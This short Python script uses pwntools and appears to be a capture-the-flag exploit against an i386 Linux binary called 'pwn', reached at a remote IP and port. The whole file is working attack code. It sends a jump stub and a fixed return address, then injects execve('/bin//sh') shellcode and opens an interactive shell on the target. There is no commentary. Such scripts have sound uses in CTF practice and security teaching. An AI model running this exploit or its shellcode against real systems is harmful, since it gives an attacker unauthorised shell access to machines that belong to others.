from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./pwn')
else:
	p = remote('47.104.190.38',12001)
#gdb.attach(p)
p.recvuntil('index')
p.sendline('0')
p.recvuntil('Three is good number,I like it very much!')
payload1 = asm('jmp [ecx]')
p.send(payload1)
p.recvuntil('Leave you name of size:')
p.sendline('0')
p.recvuntil('me')
payload2 = p32(0x8048BD6)
p.sendline(payload2)
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
p.sendline(shellcode)
p.recvuntil('Leave you name of size:')
p.sendline('0')
p.recvuntil('me')
payload2 = p32(0x8048BD6)
p.sendline(payload2)

p.interactive()